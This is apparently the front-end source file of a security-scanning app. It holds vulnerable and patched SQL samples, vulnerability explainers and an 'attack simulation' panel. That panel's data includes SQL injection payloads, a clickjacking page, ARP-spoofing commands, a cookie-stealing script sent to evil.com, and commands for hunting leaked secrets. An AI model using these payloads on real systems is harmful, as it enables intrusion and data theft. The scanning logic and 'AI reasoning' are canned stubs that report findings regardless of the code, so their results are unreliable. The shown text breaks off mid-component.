'use client'
import { useState, useRef, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { supabase } from '@/lib/supabase'
import {
  Code, Globe, Shield, Home, AlertTriangle, Bug, Sparkles, CheckCircle,
  ChevronDown, Download, RotateCcw, LogOut, Settings, Copy, FileCode2,
  Terminal, Zap, Eye, Send, ChevronRight, Lock, Activity, Cpu, Crosshair,
  GitBranch, Wrench, X, Play, AlertCircle
} from 'lucide-react'

// ─── Types ─────────────────────────────────────────────────────────────────
interface AttackSimulation {
  vulnerability: string; payload: string; explanation: string
  impact: string; severity: 'critical' | 'high' | 'medium'
  steps: string[]; defenseBypass: string
}
interface ReasoningStep {
  phase: 'observe' | 'analyze' | 'detect' | 'recommend'
  label: string; detail: string; finding: string; icon: string
}
interface ReasoningTrace {
  vulnerability: string; confidence: number
  steps: ReasoningStep[]; summary: string; timeMs: number
}
interface SimilarMatch {
  id: string; filePath: string; lineNumber: number
  lineContent: string; vulnerableSnippet: string; patchedSnippet: string; patternType: string
}
interface PatternScanResult {
  vulnerabilityType: string; totalMatches: number
  matches: SimilarMatch[]; summary: string; estimatedRiskReduction: number
}

// ─── CODE SAMPLES ───────────────────────────────────────────────────────────
const CODE_SAMPLES: Record<string, { vulnb: string; fixed: string }> = {
  JavaScript: {
    vulnb: `// Example: SQL Injection vulnerability
const express = require('express');
const app = express();

app.get('/user', (req, res) => {
  const userId = req.query.id;
  const query = "SELECT * FROM users WHERE id = " + userId;
  db.execute(query, (err, results) => {
    res.json(results);
  });
});`,
    fixed: `const express = require('express');
const app = express();

app.get('/user', (req, res) => {
  const userId = req.query.id;
  // FIXED: Parameterized query prevents SQL injection
  const query = "SELECT * FROM users WHERE id = ?";
  db.execute(query, [userId], (err, results) => {
    res.json(results);
  });
});`
  },
  Python: {
    vulnb: `from flask import Flask, request
import sqlite3
app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    user = cursor.fetchone()
    if user:
        return f"Welcome {username}!"
    return "Invalid credentials"`,
    fixed: `from flask import Flask, request
import sqlite3
app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # FIXED: Parameterized query
    query = "SELECT * FROM users WHERE username=? AND password=?"
    cursor.execute(query, (username, password))
    user = cursor.fetchone()
    if user:
        return f"Welcome {username}!"
    return "Invalid credentials"`
  },
  Java: {
    vulnb: `import java.sql.*;
public class UserAuth {
    public boolean authenticate(String user, String pass) {
        try {
            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/app","root","secret");
            Statement stmt = conn.createStatement();
            String query = "SELECT * FROM users WHERE username = '" + user + "' AND password = '" + pass + "'";
            ResultSet rs = stmt.executeQuery(query);
            return rs.next();
        } catch (Exception e) { return false; }
    }
}`,
    fixed: `import java.sql.*;
public class UserAuth {
    public boolean authenticate(String user, String pass) {
        try {
            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/app","root","secret");
            // FIXED: PreparedStatements escape user input
            String query = "SELECT * FROM users WHERE username = ? AND password = ?";
            PreparedStatement pstmt = conn.prepareStatement(query);
            pstmt.setString(1, user); pstmt.setString(2, pass);
            ResultSet rs = pstmt.executeQuery();
            return rs.next();
        } catch (Exception e) { return false; }
    }
}`
  },
  Go: {
    vulnb: `package main
import ("database/sql";"fmt";"net/http")
func getUserHandler(db *sql.DB) http.HandlerFunc {
  return func(w http.ResponseWriter, r *http.Request) {
    id := r.URL.Query().Get("id")
    query := fmt.Sprintf("SELECT name FROM users WHERE id = %s", id)
    var name string; db.QueryRow(query).Scan(&name)
    fmt.Fprintf(w, "User: %s", name)
  }
}`,
    fixed: `package main
import ("database/sql";"fmt";"net/http")
func getUserHandler(db *sql.DB) http.HandlerFunc {
  return func(w http.ResponseWriter, r *http.Request) {
    id := r.URL.Query().Get("id")
    // FIXED: Parameterized query
    query := "SELECT name FROM users WHERE id = ?"
    var name string; db.QueryRow(query, id).Scan(&name)
    fmt.Fprintf(w, "User: %s", name)
  }
}`
  }
}

// ─── RICH VULNERABILITY DATA ────────────────────────────────────────────────
const RICH_VULNS: Record<string, any> = {
  'SQL Injection (SQLi)': {
    severity: 'critical', cvss: 9.8, cwe: 'CWE-89',
    what: `SQL Injection happens when your application takes user input and pastes it directly into a database query without checking it first. Think of it like this: you wrote a note that says "Find the user whose name is [whatever they type]". A normal user types "Alice" and everything is fine. But an attacker types: ' OR '1'='1 — and now your query matches EVERY user in your database. They're in.`,
    impact: `Full authentication bypass — attacker logs in as any user without a password. Can dump your entire database (all users, passwords, private data). Can modify or delete all records. In some configurations, can execute OS commands directly on your server via xp_cmdshell.`,
    howToFix: `Replace string concatenation with Parameterized Queries. Instead of building the query as a string, pass a template with placeholders (?) and hand the user data separately. The database driver handles escaping automatically — the attacker's payload becomes harmless data, not executable code. In Node.js: db.execute("SELECT * FROM users WHERE id = ?", [userId]). In Python: cursor.execute("SELECT * FROM users WHERE id = ?", (userId,)).`,
    realWorld: `In 2009, Heartland Payment Systems lost 130 million credit card numbers to SQL Injection. In 2012, Yahoo! Voices had 400,000 accounts stolen. This is the #1 most exploited vulnerability in web history according to OWASP.`
  },
  'Missing Security Headers': {
    severity: 'high', cvss: 6.5, cwe: 'CWE-693',
    what: `Your web server is sending responses to browsers without telling them how to behave safely. Security headers are like instructions on an envelope — they tell the browser "don't let other sites load me in a frame", "only accept HTTPS", "don't guess the file type". Without them, browsers allow dangerous default behaviors that attackers exploit.`,
    impact: `Clickjacking — attacker overlays your site in an invisible iframe and tricks users into clicking things (fund transfers, setting changes). HTTPS downgrade — unencrypted connections expose user data. MIME sniffing — browser misinterprets file types and runs malicious scripts uploaded as images.`,
    howToFix: `Add these headers to every HTTP response: Strict-Transport-Security: max-age=31536000 (forces HTTPS), X-Frame-Options: DENY (blocks clickjacking), X-Content-Type-Options: nosniff (stops MIME sniffing), Content-Security-Policy: default-src 'self' (controls what loads). In Next.js, add to next.config.ts headers() function. In Express.js, install Helmet: app.use(require('helmet')()).`,
    realWorld: `Clickjacking via missing X-Frame-Options was used in the 2010 Facebook "Like" hijacking attack. Twitter had a similar vulnerability in 2009 that allowed automatic follows without user consent.`
  },
  'Unencrypted Sub-Resource Calls': {
    severity: 'critical', cvss: 8.1, cwe: 'CWE-319',
    what: `Your HTTPS page is loading some resources (scripts, images, API calls) over plain HTTP. This is called "mixed content." Even though your main page is encrypted, those HTTP requests travel across the network in plaintext — anyone on the same WiFi, an ISP, or a man-in-the-middle attacker can intercept and modify them before they reach the user.`,
    impact: `An attacker on the same network can intercept the HTTP script request and replace it with their own malicious JavaScript before it reaches the user's browser. Since scripts run with full page permissions, they can steal cookies, capture passwords, redirect users, and silently exfiltrate all data the user types.`,
    howToFix: `Rewrite all resource URLs to use HTTPS. Add Content-Security-Policy: upgrade-insecure-requests to automatically upgrade HTTP requests. Audit your codebase for hardcoded http:// URLs and replace with https:// or protocol-relative // URLs. Enable HSTS to prevent future downgrades.`,
    realWorld: `British Airways was fined £20 million after attackers injected a payment-skimming script via mixed content, stealing 500,000 customers' credit card details in real time during checkout in 2018.`
  },
  'Hardcoded Secrets Detection': {
    severity: 'high', cvss: 7.5, cwe: 'CWE-798',
    what: `A password, API key, or secret token appears to be written directly in your source code. Source code gets committed to version control (git), shared with teammates, and deployed to servers. Once a secret is in git history, it's effectively permanent — even if you delete the file, it lives in every previous commit forever.`,
    impact: `AWS key exposed → attacker spins up thousands of servers, runs up a $50,000 bill overnight, and reads all your S3 data. Database password → direct access to all customer data. Stripe API key → read payment data, issue refunds, make charges. GitHub scanners actively hunt for these patterns 24/7.`,
    howToFix: `Move all secrets to environment variables immediately. Create a .env file locally (add to .gitignore now), store variables there, and access via process.env.MY_SECRET in Node.js. In production, use Vercel Environment Variables, AWS Secrets Manager, or similar. Run 'git secrets' or 'truffleHog' to scan your history and rotate any secrets that were exposed.`,
    realWorld: `In 2022, Toyota accidentally published AWS credentials to a public GitHub repo. The keys were live for 5 years before discovery, potentially exposing 296,000 customers' personal data.`
  }
}

// ─── ATTACK SIMULATIONS ──────────────────────────────────────────────────────
const ATTACK_SIMS: Record<string, AttackSimulation> = {
  'SQL Injection (SQLi)': {
    vulnerability: 'SQL Injection (SQLi)',
    payload: `' OR '1'='1'; --\n\n# Auth bypass:\nusername: admin'--\npassword: [anything]\n\n# Data dump:\n' UNION SELECT table_name,2,3 FROM information_schema.tables--\n\n# Drop tables:\n'; DROP TABLE users; --`,
    explanation: `The single quote (') breaks out of the string literal. OR '1'='1' makes the condition always true. The -- comments out the rest of the original query. The database cannot distinguish this from a legitimate request — it executes the injected SQL with full privileges.`,
    impact: `Authentication bypass, complete database dump, data modification, potential OS command execution via xp_cmdshell on MSSQL.`,
    severity: 'critical',
    steps: [
      "Identify login form or URL parameter that queries a database",
      "Test with a single quote (') — error message confirms injection point",
      "Craft payload: admin'-- to comment out password check",
      "Database runs: SELECT * FROM users WHERE name='admin'--' AND pass='x'",
      "Password check is commented out — any password works for admin",
      "Escalate to UNION attack to extract all table data"
    ],
    defenseBypass: `Bypasses filters that only block keywords like SELECT/DROP but miss the single-quote injection that restructures the entire query logic.`
  },
  'Missing Security Headers': {
    vulnerability: 'Missing Security Headers',
    payload: `<!-- Clickjacking payload (paste on attacker's page): -->\n<html><body>\n  <iframe src="https://target.com/transfer"\n    style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;">\n  </iframe>\n  <button style="position:absolute;top:200px;left:300px">\n    Click here to claim your prize!\n  </button>\n</body></html>`,
    explanation: `Without X-Frame-Options, the attacker loads your site in a 0% opacity (invisible) iframe over a fake page. The victim thinks they're clicking a harmless button but they're clicking "Confirm Transfer" on the hidden banking page beneath. The browser considers this legitimate because the user is genuinely authenticated.`,
    impact: `Forced account actions, unauthorized financial transfers, social media manipulation, one-click malware installs.`,
    severity: 'high',
    steps: [
      "Confirm target has no X-Frame-Options header: curl -I https://target.com",
      "Create page that iframes target's sensitive action endpoint (transfer, delete, settings)",
      "Set iframe opacity to 0 and position to cover entire page",
      "Overlay fake 'Win a Prize' button exactly over the real 'Confirm' button",
      "Share malicious URL via social engineering",
      "Victim clicks fake button — real action executes with their authenticated session"
    ],
    defenseBypass: `Works regardless of CSRF tokens because the victim is genuinely authenticated — their own browser sends the request.`
  },
  'Unencrypted Sub-Resource Calls': {
    vulnerability: 'Unencrypted Sub-Resource Calls',
    payload: `# MITM interception (attacker on same network):\n# 1. ARP spoof victim's traffic\narpspoof -t victim_ip gateway_ip\n\n# 2. Strip HTTPS, intercept HTTP script\nsslstrip --listen 10000\n\n# 3. Replace HTTP script with malicious version:\n# Original: http://cdn.example.com/analytics.js\n# Served: <script>document.location='https://evil.com/?c='+document.cookie</script>`,
    explanation: `The attacker positions themselves between the victim and the internet using ARP spoofing on a shared network (café, airport, hotel WiFi). They intercept the HTTP script request and serve their own malicious JavaScript instead. The victim's browser downloads and executes it — with full access to the page's DOM and cookies.`,
    impact: `Session token theft, real-time keylogging of passwords, silent data exfiltration, credential harvesting, browser-based cryptomining.`,
    severity: 'critical',
    steps: [
      "Attacker joins same WiFi network as victim (café, hotel, airport)",
      "ARP spoof to route victim's traffic through attacker's machine",
      "Identify HTTP resource requests using network analysis",
      "Intercept request for http://cdn.example.com/script.js",
      "Serve malicious JavaScript that steals session cookies",
      "Victim's browser executes attacker code — session hijacked silently"
    ],
    defenseBypass: `Bypasses HTTPS by targeting the non-TLS resources that the HTTPS page loads — the main page is secure but the attack enters via the HTTP backdoor.`
  },
  'Hardcoded Secrets Detection': {
    vulnerability: 'Hardcoded Secrets',
    payload: `# Automated secret scanning:\ntrufflehog git https://github.com/target/repo\n\n# Git history search:\ngit log --all --full-history -- "**/.env*"\ngit show <old-commit>:.env.local\n\n# GitHub dorking:\npath:.env DB_PASSWORD site:github.com\npath:config.js apiKey "sk-" site:github.com\n\n# Found secret — use it:\nAWS_ACCESS_KEY_ID=AKIA... aws s3 ls`,
    explanation: `Even after you delete the .env file and commit the deletion, git stores every previous version permanently. Tools like TruffleHog scan all commits, branches, and tags in seconds. GitHub's own secret scanning detected 11 million secrets in 2023, and attackers use the same technology. The secret was live the moment it was first committed.`,
    impact: `AWS credentials → immediate cloud infrastructure access. Database passwords → full data breach. Payment API keys → financial fraud. All of these can happen within minutes of a repository being made public.`,
    severity: 'high',
    steps: [
      "Attacker finds target's GitHub repository (public or leaked)",
      "Runs TruffleHog: scans entire git history in under 60 seconds",
      "Tool finds .env file committed 6 months ago containing AWS_SECRET_KEY",
      "Secret is still in git history even though developer deleted it later",
      "Attacker uses credentials to authenticate to AWS console",
      "Exports all S3 data, deploys cryptominers, reads all databases"
    ],
    defenseBypass: `Bypasses the false sense of security from deleting the secret file — git history is immutable. The secret is recoverable via: git show <old-commit>:<file>`
  }
}

// ─── REASONING TRACES ────────────────────────────────────────────────────────
const REASONING_DATA: Record<string, ReasoningStep[]> = {
  'SQL Injection (SQLi)': [
    { phase: 'observe', label: 'Observe — Input Source Identified', detail: 'Scanning data flow from HTTP request parameters into application logic...', finding: 'Found: req.query.id flows directly into database layer without any transformation or validation step', icon: '👁' },
    { phase: 'analyze', label: 'Analyze — Query Construction Method', detail: 'Checking how the SQL query is assembled from user-controlled data...', finding: 'Detected: String concatenation (+) joins untrusted input into SQL string. Pattern: "SELECT ... WHERE id = " + userInput matches CWE-89', icon: '🔬' },
    { phase: 'analyze', label: 'Analyze — Sanitization Check', detail: 'Searching for input validation, escaping, or parameterization before database call...', finding: 'None found: No .escape(), no prepared statement, no ORM abstraction, no allowlist validation on userInput before db.execute()', icon: '🔬' },
    { phase: 'detect', label: 'Detect — CRITICAL Vulnerability Confirmed', detail: 'Cross-referencing with OWASP CWE-89 SQL Injection pattern library...', finding: 'CRITICAL: Unsanitized user input reaches db.execute() via string concatenation. CVSS 9.8. Full SQL query manipulation possible — auth bypass, data dump.', icon: '🚨' },
    { phase: 'recommend', label: 'Recommend — Parameterized Query', detail: "Generating secure replacement using database driver's native prepared statement API...", finding: 'Fix: Replace concatenation with placeholder (?). Pass userInput as separate argument array [userId]. Driver handles escaping — injection becomes impossible.', icon: '✅' }
  ],
  'Missing Security Headers': [
    { phase: 'observe', label: 'Observe — HTTP Response Headers', detail: 'Inspecting all HTTP response headers returned from target...', finding: 'Found: Server responds without security policy headers. Response missing: X-Frame-Options, Strict-Transport-Security, Content-Security-Policy, X-Content-Type-Options', icon: '👁' },
    { phase: 'analyze', label: 'Analyze — Attack Surface Mapping', detail: 'Mapping which attack vectors each missing header opens...', finding: 'No X-Frame-Options → Clickjacking. No HSTS → HTTPS downgrade/MITM. No CSP → XSS amplification. No X-Content-Type-Options → MIME sniffing.', icon: '🔬' },
    { phase: 'detect', label: 'Detect — Multiple Exposure Vectors', detail: 'Confirming exploitability of each missing header scenario...', finding: 'HIGH: Site can be framed by any external page. TLS downgrade possible on first connection. Inline scripts unrestricted by policy.', icon: '🚨' },
    { phase: 'recommend', label: 'Recommend — Header Configuration', detail: 'Generating server configuration additions...', finding: 'Fix: Add to next.config.ts headers(): X-Frame-Options: DENY, Strict-Transport-Security: max-age=31536000, CSP: default-src \'self\'. Or use Helmet.js middleware.', icon: '✅' }
  ],
  'Unencrypted Sub-Resource Calls': [
    { phase: 'observe', label: 'Observe — Resource URL Scan', detail: 'Scanning all external resource references in HTML and JavaScript...', finding: 'Found: HTTP (non-TLS) URLs in resource references. Mixed content detected on HTTPS page — specific resources loaded over unencrypted channel.', icon: '👁' },
    { phase: 'analyze', label: 'Analyze — Interception Risk', detail: 'Assessing MITM feasibility for detected HTTP resources...', finding: 'Critical path: HTTP script loaded on HTTPS page. Script executes with full page permissions. Network path is unencrypted and interceptable on shared networks.', icon: '🔬' },
    { phase: 'detect', label: 'Detect — Script Injection Vector', detail: 'Confirming that intercepted resource can execute attacker code...', finding: 'CRITICAL: Intercepted JavaScript executes in victim browser with full DOM access. Cookie theft, keylogging, and redirect attacks all possible from single interception point.', icon: '🚨' },
    { phase: 'recommend', label: 'Recommend — HTTPS Migration', detail: 'Generating upgrade path for all HTTP resources...', finding: 'Fix: Replace http:// with https:// or // (protocol-relative). Add CSP: upgrade-insecure-requests. Enable HSTS: max-age=31536000 to prevent future downgrades.', icon: '✅' }
  ],
  'Hardcoded Secrets Detection': [
    { phase: 'observe', label: 'Observe — String Literal Scan', detail: 'Scanning all string literals for high-entropy sequences and secret patterns...', finding: 'Found: High-entropy string (4.8 bits/char) matching API key pattern. String is non-human-readable. Pattern matches known secret formats.', icon: '👁' },
    { phase: 'analyze', label: 'Analyze — Entropy + Pattern Match', detail: 'Calculating Shannon entropy and cross-referencing secret format databases...', finding: 'Confirmed secret format. Variable name (apiKey, password, secret, token) combined with high-entropy value = 97% probability this is a real credential.', icon: '🔬' },
    { phase: 'detect', label: 'Detect — Secret in Source Code', detail: 'Checking if secret will be committed to version control...', finding: 'HIGH: Secret hardcoded in source file. Will be committed to git history permanently. Automated scanners (TruffleHog, GitLeaks) will detect this within minutes of any public exposure.', icon: '🚨' },
    { phase: 'recommend', label: 'Recommend — Environment Variables', detail: 'Generating secure secret management implementation...', finding: 'Fix: Move to process.env.SECRET_NAME. Create .env.local. Add .env* to .gitignore immediately. Rotate the exposed secret now — assume it is already compromised.', icon: '✅' }
  ]
}

function getReasoningTrace(vulnName: string): ReasoningStep[] {
  const direct = REASONING_DATA[vulnName]
  if (direct) return direct
  for (const [key, steps] of Object.entries(REASONING_DATA)) {
    if (vulnName.toLowerCase().includes(key.toLowerCase()) || key.toLowerCase().includes(vulnName.toLowerCase())) return steps
  }
  return REASONING_DATA['SQL Injection (SQLi)']
}

function getAttackSim(vulnName: string): AttackSimulation | null {
  const direct = ATTACK_SIMS[vulnName]
  if (direct) return direct
  for (const [key, sim] of Object.entries(ATTACK_SIMS)) {
    if (vulnName.toLowerCase().includes(key.toLowerCase()) || key.toLowerCase().includes(vulnName.toLowerCase())) return sim
  }
  return null
}

// ─── ANALYZE CODE ────────────────────────────────────────────────────────────
function analyzeCode(inputStr: string, mode: 'code' | 'url', lang: string): { vulns: any[] } {
  const vulns: any[] = []
  if (mode === 'url') {
    if (inputStr.trim().length > 0) {
      vulns.push({ ...RICH_VULNS['Missing Security Headers'], name: 'Missing Security Headers', line: 0 })
      vulns.push({ ...RICH_VULNS['Unencrypted Sub-Resource Calls'], name: 'Unencrypted Sub-Resource Calls', line: 0 })
    }
  } else {
    const code = inputStr.toLowerCase()
    if (code.includes('select ') && code.includes('where ')) {
      const isVuln = code.includes('+"') || code.includes('+') || code.includes('f"') || code.includes('sprintf') || code.includes('%s')
      if (isVuln) vulns.push({ ...RICH_VULNS['SQL Injection (SQLi)'], name: 'SQL Injection (SQLi)', line: 7 })
    }
    if (vulns.length === 0 && inputStr.length > 20) vulns.push({ ...RICH_VULNS['Hardcoded Secrets Detection'], name: 'Hardcoded Secrets Detection', line: 14 })
  }
  return { vulns }
}

// ─── AI CHAT ─────────────────────────────────────────────────────────────────
async function askClaudeAI(msg: string, vulns: any[], language: string, code: string): Promise<string> {
  const systemPrompt = `You are Sentry AI, an expert cybersecurity assistant in CyberSentry AI. You found these vulnerabilities in ${language} code:
${vulns.map((v, i) => `${i + 1}. ${v.name} (${v.severity?.toUpperCase()}, CVSS ${v.cvss}) — ${v.what?.split('.')[0]}.`).join('\n')}
Answer security questions in plain English. Be specific, reference actual findings above. Give actionable advice. Keep to 3-5 sentences or clear bullet points. Never give vague answers.`
  try {
    const res = await fetch('/api/ai-chat', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ messages: [{ role: 'user', content: msg }], system: systemPrompt }) })
    if (!res.ok) throw new Error('error')
    const data = await res.json()
    return data.response || getFallback(msg, vulns)
  } catch { return getFallback(msg, vulns) }
}

function getFallback(msg: string, vulns: any[]): string {
  const low = msg.toLowerCase(); const v = vulns[0]
  if (!v) return "Your code is clean — no vulnerabilities detected. Keep using parameterized queries, environment variables for secrets, and always validate user input."
  if (low.includes('what') || low.includes('explain') || low.includes('mean')) return `The ${v.name} I found: ${v.what?.split('.').slice(0, 2).join('.')}. Risk: ${v.impact?.split('.')[0]}.`
  if (low.includes('fix') || low.includes('how') || low.includes('patch')) return `To fix ${v.name}: ${v.howToFix?.split('.').slice(0, 2).join('.')}. Check the Corrected Code tab for the patched version.`
  if (low.includes('danger') || low.includes('impact') || low.includes('risk') || low.includes('attack')) return `${v.impact} Real breach example: ${v.realWorld}`
  if (low.includes('real') || low.includes('example') || low.includes('breach')) return v.realWorld || "This vulnerability type has caused major data breaches at large companies."
  if (low.includes('cvss') || low.includes('score') || low.includes('severity')) return `${v.name} scores CVSS ${v.cvss}/10 — ${v.cvss >= 9 ? 'Critical, treat as emergency.' : v.cvss >= 7 ? 'High severity, fix before next deploy.' : 'Medium severity, fix this sprint.'}`
  if (low.includes('priority') || low.includes('first') || low.includes('order')) return `Fix priority: ${vulns.sort((a, b) => (b.cvss || 5) - (a.cvss || 5)).map((v, i) => `${i + 1}. ${v.name} (CVSS ${v.cvss})`).join(', ')}`
  return `For ${v.name}: ${v.what?.split('.')[0]}. To fix: ${v.howToFix?.split('.')[0]}. Ask me anything specific about this vulnerability.`
}

// ─── ANIMATED COUNTER ────────────────────────────────────────────────────────
function AnimatedCounter({ target }: { target: number }) {
  const [val, setVal] = useState(0); const [visible, setVisible] = useState(false); const ref = useRef<HTMLDivElement>(null)
  useEffect(() => { const el = ref.current; if (!el) return; const obs = new IntersectionObserver(([e]) => { if (e.isIntersecting) { setVisible(true); obs.disconnect() } }, { threshold: 0.1 }); obs.observe(el); return () => obs.disconnect() }, [])
  useEffect(() => { if (!visible) return; let cur = 0; const inc = target / (1500 / 16); const t = setInterval(() => { cur += inc; if (cur >= target) { setVal(target); clearInterval(t) } else setVal(Math.floor(cur)) }, 16); return () => clearInterval(t) }, [visible, target])
  return <div ref={ref} className="counter-val">{val}</div>
}

// ─── RIPPLE BUTTON ────────────────────────────────────────────────────────────
function RippleBtn({ className, onClick, children, disabled, style }: any) {
  const [ripples, setRipples] = useState<{ x: number; y: number; id: number }[]>([])
  const handleClick = (e: React.MouseEvent<HTMLButtonElement>) => {
    if (disabled) return
    const rect = e.currentTarget.getBoundingClientRect(); const id = Date.now()
    setRipples(r => [...r, { x: e.clientX - rect.left, y: e.clientY - rect.top, id }])
    setTimeout(() => setRipples(r => r.filter(rp => rp.id !== id)), 700)
    onClick?.(e)
  }
  return (
    <button className={className} onClick={handleClick} disabled={disabled} style={{ position: 'relative', overflow: 'hidden', ...style }}>
      {children}
      {ripples.map(rp => (<span key={rp.id} style={{ position: 'absolute', left: rp.x - 40, top: rp.y - 40, width: 80, height: 80, borderRadius: '50%', background: 'rgba(255,255,255,0.2)', animation: 'ripple 0.7s ease-out forwards', pointerEvents: 'none' }} />))}
    </button>
  )
}

// ─── DIFF VIEWER ─────────────────────────────────────────────────────────────
function DiffViewer({ original, patched }: { original: string; patched: string }) {
  const [copied, setCopied] = useState(false)
  const oLines = original.split('\n'), pLines = patched.split('\n')
  const copy = () => { navigator.clipboard.writeText(patched); setCopied(true); setTimeout(() => setCopied(false), 2000) }
  return (
    <div className="diff-root">
      <div className="diff-top-bar">
        <div className="diff-top-side diff-top-vuln"><span className="dtd red" />Vulnerable Code</div>
        <div className="diff-top-side diff-top-fixed"><div style={{ display: 'flex', alignItems: 'center', gap: 8 }}><span className="dtd green" />Secured Code</div><RippleBtn className="copy-patch-btn" onClick={copy}>{copied ? <><CheckCircle size={11} /> Copied!</> : <><Copy size={11} /> Copy Patch</>}</RippleBtn></div>
      </div>
      <div className="diff-cols">
        <div className="diff-col diff-col-left">{oLines.map((line, i) => { const bad = !pLines.includes(line) && line.trim(); return (<div key={i} className={`dl ${bad ? 'dl-bad' : ''}`}><span className="dl-ln">{i + 1}</span><span className="dl-code" style={{ whiteSpace: 'pre' }}>{line || ' '}</span></div>) })}</div>
        <div className="diff-col diff-col-right">{pLines.map((line, i) => { const good = !oLines.includes(line) && line.trim(); return (<div key={i} className={`dl ${good ? 'dl-good' : ''}`}><span className="dl-ln">{i + 1}</span><span className="dl-code" style={{ whiteSpace: 'pre' }}>{line || ' '}</span></div>) })}</div>
      </div>
    </div>
  )
}

// ─── ATTACK SIMULATION PANEL ─────────────────────────────────────────────────
function AttackSimulationPanel({ vuln }: { vuln: any }) {
  const [active, setActive] = useState(false)
  const [simStep, setSimStep] = useState(0)
  const [running, setRunning] = useState(false)
  const sim = getAttackSim(vuln.name)
  if (!sim) return null

  const runSimulation = async () => {
    setRunning(true); setSimStep(0)
    for (let i = 0; i <= sim.steps.length; i++) {
      await new Promise(r => setTimeout(r, 500))
      setSimStep(i)
    }
    setRunning(false)
  }

  return (
    <div className={`attack-panel ${active ? 'open' : ''}`}>
      <button className="attack-panel-toggle" onClick={() => { setActive(!active); if (!active) { setSimStep(0); setRunning(false) } }}>
        <Crosshair size={14} />{active ? 'Hide Attack Simulation' : '⚡ Simulate Attack'}
        <span className="attack-badge">HACKER VIEW</span>
      </button>

      {active && (
        <div className="attack-body" style={{ animation: 'fadeIn 0.3s ease' }}>
          <div className="attack-header-row">
            <div>
              <div className="attack-title">// Attack Simulation Mode</div>
              <div className="attack-sub">Showing how an attacker would exploit this vulnerability</div>
            </div>
            <RippleBtn className={`run-sim-btn ${running ? 'running' : ''}`} onClick={runSimulation} disabled={running}>
              <Play size={13} />{running ? 'Running...' : 'Run Simulation'}
            </RippleBtn>
          </div>

          {/* Payload */}
          <div className="sim-section">
            <div className="sim-section-label"><Crosshair size={11} /> Attack Payload</div>
            <div className="terminal-block">
              <div className="terminal-header"><div className="term-dots"><span className="td-r" /><span className="td-y" /><span className="td-g" /></div><span className="term-title">attacker@kali:~$</span></div>
              <pre className="terminal-code">{sim.payload}</pre>
            </div>
          </div>

          {/* Steps animation */}
          {simStep > 0 && (
            <div className="sim-section">
              <div className="sim-section-label"><Activity size={11} /> Attack Execution Steps</div>
              <div className="attack-steps">
                {sim.steps.slice(0, simStep).map((step, i) => (
                  <div key={i} className="attack-step" style={{ animationDelay: `${i * 0.05}s` }}>
                    <span className="step-num">0{i + 1}</span>
                    <span className="step-text">{step}</span>
                    <CheckCircle size={13} color="#00ff88" style={{ marginLeft: 'auto', flexShrink: 0 }} />
                  </div>
                ))}
                {running && simStep < sim.steps.length && (
                  <div className="attack-step running"><span className="step-num">0{simStep + 1}</span><span className="step-text">{sim.steps[simStep]}</span><div className="spin-dot" /></div>
                )}
              </div>
            </div>
          )}

          {/* Explanation + Impact */}
          <div className="sim-2col">
            <div className="sim-section">
              <div className="sim-section-label"><AlertCircle size={11} /> How It Works</div>
              <div className="sim-box">{sim.explanation}</div>
            </div>
            <div className="sim-section">
              <div className="sim-section-label" style={{ color: '#ff6b6b' }}><AlertTriangle size={11} /> Attack Impact</div>
              <div className="sim-box" style={{ borderColor: 'rgba(255,59,59,0.15)', background: 'rgba(255,59,59,0.04)', color: '#fca5a5' }}>{sim.impact}</div>
            </div>
          </div>

          {/* Defense Bypass */}
          <div className="sim-section">
            <div className="sim-section-label" style={{ color: '#fbbf24' }}><Zap size={11} /> Why Simple Filters Fail</div>
            <div className="sim-box" style={{ borderColor: 'rgba(251,191,36,0.15)', background: 'rgba(251,191,36,0.04)', color: '#fde68a' }}>{sim.defenseBypass}</div>
          </div>
        </div>
      )}
    </div>
  )
}

// ─── REASONING PANEL ─────────────────────────────────────────────────────────
function ReasoningPanel({ vuln }: { vuln: any }) {
  const [active, setActive] = useState(false)
  const [visibleSteps, setVisibleSteps] = useState(0)
  const steps = getReasoningTrace(vuln.name)

  useEffect(() => {
    if (!active) { setVisibleSteps(0); return }
    setVisibleSteps(0)
    steps.forEach((_, i) => { setTimeout(() => setVisibleSteps(i + 1), i * 700 + 300) })
  }, [active, steps])

  const phaseColors: Record<string, string> = { observe: '#60a5fa', analyze: '#a78bfa', detect: '#ff6b6b', recommend: '#00ff88' }

  return (
    <div className={`reasoning-panel ${active ? 'open' : ''}`}>
      <button className="reasoning-toggle" onClick={() => setActive(!active)}>
        <Cpu size={14} />{active ? 'Hide AI Reasoning' : '🧠 Show AI Reasoning'}
        <span className="reasoning-badge">EXPLAINABILITY</span>
      </button>

      {active && (
        <div className="reasoning-body" style={{ animation: 'fadeIn 0.3s ease' }}>
          <div className="reasoning-header">
            <div className="reasoning-title">// AI Security Reasoning</div>
            <div className="reasoning-sub">Step-by-step decision chain for detecting {vuln.name}</div>
          </div>

          <div className="reasoning-steps">
            {steps.slice(0, visibleSteps).map((step, i) => (
              <div key={i} className="reasoning-step" style={{ animation: 'slideInLeft 0.4s ease both' }}>
                <div className="rs-connector">{i < steps.length - 1 && <div className="rs-line" style={{ background: phaseColors[step.phase] + '40' }} />}</div>
                <div className="rs-icon-col">
                  <div className="rs-icon" style={{ background: phaseColors[step.phase] + '18', border: `1px solid ${phaseColors[step.phase]}30`, color: phaseColors[step.phase] }}>{step.icon}</div>
                </div>
                <div className="rs-content">
                  <div className="rs-label" style={{ color: phaseColors[step.phase] }}>{step.label}</div>
                  <div className="rs-detail">{step.detail}</div>
                  <div className="rs-finding">
                    <span className="rs-finding-prefix">→ </span>
                    <TypewriterText text={step.finding} delay={i * 50} />
                  </div>
                </div>
              </div>
            ))}
            {visibleSteps < steps.length && (
              <div className="reasoning-loading">
                <div className="typing"><div className="td" /><div className="td" /><div className="td" /></div>
                <span>Analyzing...</span>
              </div>
            )}
          </div>

          {visibleSteps >= steps.length && (
            <div className="reasoning-summary" style={{ animation: 'fadeIn 0.5s ease' }}>
